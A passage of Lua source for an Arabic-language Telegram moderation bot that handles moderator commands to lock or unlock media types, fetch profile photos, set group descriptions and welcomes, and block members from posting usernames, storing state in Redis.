if text == 'قفل الصور بالتقيد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:set(DEVSTOR..'lockked:photo'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lock:photo'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:photo'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockktm:photo'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* الــصور\n*◗📛¦ خـاصيــه ، التقـيـد 💭*'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'قفل الروابط بالتقيد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then tahadevstorm:set(DEVSTOR..'lockked:links'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lock:links'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:links'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockktm:links'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* الــروابط\n*◗📛¦ خـاصيــه ، التقـيـد 💭*'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'قفل البوتات بالتقيد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:set(DEVSTOR..'lockked:bots'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lock:bots:kick'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:bots:kick'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل اضافه* البوتات\n*◗📛¦ خاصيه ، تقيد العضو وطرد البوت 💭*'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'قفل الشارحه بالتقيد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:set(DEVSTOR..'lockked:cmds'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lock:cmds'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:cmds'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockktm:cmds'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* الــشارحه\n*◗📛¦ خـاصيــه ، التقـيـد 💭*'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'قفل المعرفات بالتقيد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:set(DEVSTOR..'lockked:user'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lock:user'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:user'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockktm:user'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* الــمعرفات\n*◗📛¦ خـاصيــه ، التقـيـد 💭*'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'قفل التاك بالتقيد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:set(DEVSTOR..'lockked:hash'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lock:hash'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:hash'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockktm:hash'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* الــتاك\n*◗📛¦ خـاصيــه ، التقـيـد 💭*'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'قفل الصوت بالتقيد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then tahadevstorm:set(DEVSTOR..'lockked:muse'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lock:muse'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:muse'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockktm:muse'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* الــصوت\n*◗📛¦ خـاصيــه ، التقـيـد 💭*'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'قفل الفيديو بالتقيد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:set(DEVSTOR..'lockked:ved'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lock:ved'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:ved'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockktm:ved'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* الــفيديو\n*◗📛¦ خـاصيــه ، التقـيـد 💭*'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'قفل المتحركه بالتقيد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:set(DEVSTOR..'lockked:gif'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lock:gif'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:gif'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockktm:gif'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* الــمتحركه\n*◗📛¦ خـاصيــه ، التقـيـد 💭*'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'قفل الملصقات بالتقيد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:set(DEVSTOR..'lockked:ste'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lock:ste'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:ste'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockktm:ste'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* الــملصقات\n*◗📛¦ خـاصيــه ، التقـيـد 💭*'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'قفل الالعاب بالتقيد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:set(DEVSTOR..'lockked:geam'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lock:geam'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:geam'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockktm:geam'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* الالـعاب\n*◗📛¦ خـاصيــه ، التقـيـد 💭*'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'قفل الاغاني بالتقيد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:set(DEVSTOR..'lockked:vico'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lock:vico'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:vico'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockktm:vico'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* الاغـاني\n*◗📛¦ خـاصيــه ، التقـيـد 💭*'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'قفل اللستات بالتقيد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:set(DEVSTOR..'lockked:inlin'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lock:inlin'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:inlin'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockktm:inlin'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* اللستـات\n*◗📛¦ خـاصيــه ، التقـيـد 💭*'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'قفل الدخول بالتقيد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:set(DEVSTOR..'lockked:addm'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lock:addm'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:addm'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockktm:addm'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم قفـل دخول الاعضاء*\n*◗📛¦ خـاصيــه ، التقـيـد 💭*'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'قفل التوجيه بالتقيد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:set(DEVSTOR..'lockked:fwd'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lock:fwd'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:fwd'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockktm:fwd'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* الــتوجيه\n*◗📛¦ خـاصيــه ، التقـيـد 💭*'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'قفل الكلايش بالتقيد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:set(DEVSTOR..'lockked:spm'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lock:spm'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:spm'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockktm:spm'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* الــكلايش\n*◗📛¦ خـاصيــه ، التقـيـد 💭*'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'قفل الملفات بالتقيد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:set(DEVSTOR..'lockked:file'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lock:file'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:file'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockktm:file'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* الــملفات\n*◗📛¦ خـاصيــه ، التقـيـد 💭*'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'قفل الماركداون بالتقيد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:set(DEVSTOR..'lockked:mark'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lock:mark'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:mark'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockktm:mark'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* الماركداون\n*◗📛¦ خـاصيــه ، التقـيـد 💭*'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'قفل الجهات بالتقيد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:set(DEVSTOR..'lockked:phon'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lock:phon'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:phon'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockktm:phon'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* الــجهات\n*◗📛¦ خـاصيــه ، التقـيـد 💭*'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'قفل السيلفي بالتقيد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:set(DEVSTOR..'lockked:self'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lock:self'..chat_id,true)  tahadevstorm:del(DEVSTOR..'lockkick:self'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockktm:self'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* بصمه الفيديو\n*◗📛¦ خـاصيــه ، التقـيـد 💭*'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md') end
if text == 'فتح الصور بالتقيد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:del(DEVSTOR..'lockked:photo'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* الــصور\n✘' storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح الروابط بالتقيد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:del(DEVSTOR..'lockked:links'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* الــروابط\n✘' storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'فتح الشارحه بالتقيد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:del(DEVSTOR..'lockked:cmds'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* الــشارحه\n✘' storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح المعرفات بالتقيد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:del(DEVSTOR..'lockked:user'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* الــمعرفات\n✘' storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح التاك بالتقيد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:del(DEVSTOR..'lockked:hash'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* الــتاك\n✘' storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح الصوت بالتقيد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then tahadevstorm:del(DEVSTOR..'lockked:muse'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* الــصوت\n✘' storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح الفيديو بالتقيد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:del(DEVSTOR..'lockked:ved'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* الــفيديو\n✘' storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح المتحركه بالتقيد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:del(DEVSTOR..'lockked:gif'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* الــمتحركه\n✘' storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح الملصقات بالتقيد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:del(DEVSTOR..'lockked:ste'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* الــملصقات\n✘' storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح الالعاب بالتقيد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:del(DEVSTOR..'lockked:geam'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* الالـعاب\n✘' storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح الاغاني بالتقيد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:del(DEVSTOR..'lockked:vico'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* الاغـاني\n✘' storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح اللستات بالتقيد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:del(DEVSTOR..'lockked:inlin'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* اللستـات\n✘' storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح الدخول بالتقيد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:del(DEVSTOR..'lockked:addm'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح دخول الاعضاء*\n✘' storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح التوجيه بالتقيد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:del(DEVSTOR..'lockked:fwd'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* الــتوجيه\n✘' storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح البوتات بالتقيد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:del(DEVSTOR..'lockked:bots'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lock:bots:kick'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:bots:kick'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتح اضافه* بوتات\n✘'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'فتح الكلايش بالتقيد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:del(DEVSTOR..'lockked:spm'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* الــكلايش\n✘' storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح الملفات بالتقيد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:del(DEVSTOR..'lockked:file'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* الــملفات \n✘' storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح التعديل بالتقيد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:del(DEVSTOR..'lockked:edit'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح تعديل الرسائل*\n✘' storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح الماركداون بالتقيد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:del(DEVSTOR..'lockked:mark'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* الماركداون\n✘' storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح الجهات بالتقيد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:del(DEVSTOR..'lockked:phon'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* الــجهات\n✘' storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح السيلفي بالتقيد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:del(DEVSTOR..'lockked:self'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..from_username(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* بصمه الفيديو\n✘' storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md') end      
if text and text:match("^(جلب صوره) (%d+) (رقم) (%d+)")  then  local matches = {text:match("^(جلب صوره) (%d+) (رقم) (%d+)")}  local function getpro(arg,data) if data.photos_[0] then sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, data.photos_[0].sizes_[1].photo_.persistent_id_,'📬¦ تفضل هاي صورة {'..matches[2]..'}\n') else storm_sendMsg(msg.chat_id_, msg.id_,1, '*♦️¦ العضو { '..matches[2]..' }\n♦️*¦* لا توجد صوره رقم *{'..matches[4]..'}* في حسابه \n',1,'md') end end tdcli_function ({ID ="GetUserProfilePhotos", user_id_ = matches[2], offset_ = matches[4] -1, limit_ = 100 }, getpro, nil)   end 
if text == "حذف الصوره" and is_mod(msg) then deleteChatPhoto(msg.chat_id_) storm_sendMsg(msg.chat_id_, msg.id_,1, '*📛¦* تم حذف الصوره المجموعه \n',1,'md') end
if text and text:match("^ضع وصف$") and is_mod(msg) then  tahadevstorm:setex(DEVSTOR.."set:description" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 10000, true)  local t = '*📋¦* ارسل النص الذي تريده '  storm_sendMsg(msg.chat_id_, msg.id_, 1,t, 1, 'md') end
if text and text:match("^ضع ترحيب$") and is_mod(msg) then  tahadevstorm:setex(DEVSTOR.."welc:bot" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 10000, true)  local t = '*📃¦* ارسل النص الذي تريده '  storm_sendMsg(msg.chat_id_, msg.id_, 1,t, 1, 'md') end
if text and text:match("^جلب صوره$") and not tahadevstorm:get(DEVSTOR.."lock:get:photo"..msg.chat_id_) then  tahadevstorm:setex(DEVSTOR.."photo:bot" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 10000, true)  local t = '*📛¦* ارسل رقم الصوره الان '  storm_sendMsg(msg.chat_id_, msg.id_, 1,t, 1, 'md') end
if text == 'قفل المعرفات' and tonumber(msg.reply_to_message_id_) > 0 and is_mod(msg) then    function kick_by_reply(extra, result, success)    if not msg.can_be_deleted_ == true then    storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦* يرجى ترقيتي ادمن هنا ◖🍃\n", 1, "md")    else    if tonumber(result.sender_user_id_) == tonumber(bot_id) then     storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لا تستطيع حظر او كتم او طرد او تقيد البوت 💢*', 1, 'md')     return false  end    if storm3(msg.chat_id_,result.sender_user_id_) then    storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع منع الارسال من ال(مدراء و المنشئين) 💢*', 1, 'md')   return false  end     tahadevstorm:incrby('numlockuserneam'..msg.chat_id_..result.sender_user_id_,160000066)   tahadevstorm:sadd(DEVSTOR..'lockuserneam:ban'..msg.chat_id_,result.sender_user_id_)      zo = '*◗💢¦* العضــو [ '..get_username(result.sender_user_id_)..' ]\n*◗🚸¦ الايــدي { '..result.sender_user_id_..' }*\n*◗📛¦* تـم منعـه مـن ارســال المعرفات'   storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")    end  end getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),kick_by_reply)    end
if text and text:match('^قفل المعرفات (%d+)') and is_mod(msg)  then    local user = text:match('قفل المعرفات (%d+)')     function bot_kick(extra, result, success) username = ''..(result.username_ or ' لم يضع معرف ✨')..''   if not msg.can_be_deleted_ == true then    storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦* تنبيــه انا لست ادمن يرجى ترقيتي ادمن هنا 👮\n", 1, "md")    else    if tonumber(user) == tonumber(bot_id) then     storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لا تستطيع حظر او كتم او طرد او تقيد البوت 💢*', 1, 'md')     return false  end    if storm3(msg.chat_id_,user) then    storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع منع الارسال من ال(مدراء و المنشئين) 💢*', 1, 'md')    return false  end      tahadevstorm:incrby('numlockuserneam'..msg.chat_id_..user,10000000)   tahadevstorm:sadd(DEVSTOR..'lockuserneam:ban'..msg.chat_id_,user)      zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..user..' }*\n*◗📛¦* تـم منعـه مـن ارســال المعرفات'   storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")    end end getUser(user, bot_kick) end
if text and text:match('^قفل المعرفات @(.*)') and is_mod(msg) then    local username = text:match('قفل المعرفات @(.*)')    function kick_username(extra,result,success)    if result.id_ then     if tonumber(result.id_) == tonumber(bot_id) then     storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لا تستطيع حظر او كتم او طرد او تقيد البوت 💢*', 1, 'md')     return false  end    if storm3(msg.chat_id_,result.id_) then    storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع منع الارسال من ال(مدراء و المنشئين) 💢*', 1, 'md')    else    if not msg.can_be_deleted_ == true then    storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦* تنبيــه انا لست ادمن يرجى ترقيتي ادمن هنا 👮\n", 1, "md")    else    tahadevstorm:incrby('numlockuserneam'..msg.chat_id_..result.id_,160000066)   tahadevstorm:sadd(DEVSTOR..'lockuserneam:ban'..msg.chat_id_,result.id_)      zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..result.id_..' }*\n*◗📛¦* تـم منعـه مـن ارســال المعرفات'   storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")    end end end end    saddbyusername(username,kick_username)    end
if text == 'فتح المعرفات' and tonumber(msg.reply_to_message_id_) > 0 and is_mod(msg) then    function kick_by_reply(extra, result, success)    tahadevstorm:del('numlockuserneam'..msg.chat_id_..result.sender_user_id_)   tahadevstorm:srem(DEVSTOR..'lockuserneam:ban'..msg.chat_id_,result.sender_user_id_)      zo = '*◗💢¦* العضــو [ '..get_username(result.sender_user_id_)..' ]\n*◗🚸¦ الايــدي { '..result.sender_user_id_..' }*\n*◗📛¦* تـم الغـاء منـعه مـن المعرفات'   storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")    end     getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),kick_by_reply)    end
if text and text:match('^فتح المعرفات (%d+)') and is_mod(msg)  then    local user = text:match('فتح المعرفات (%d+)')     function bot_kick(extra, result, success) username = ''..(result.username_ or ' لم يضع معرف ✨')..''   tahadevstorm:del('numlockuserneam'..msg.chat_id_..user)   tahadevstorm:srem(DEVSTOR..'lockuserneam:ban'..msg.chat_id_,user)      zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..user..' }*\n*◗📛¦* تـم الغـاء منـعه مـن المعرفات'   storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")     end   getUser(user, bot_kick)   end
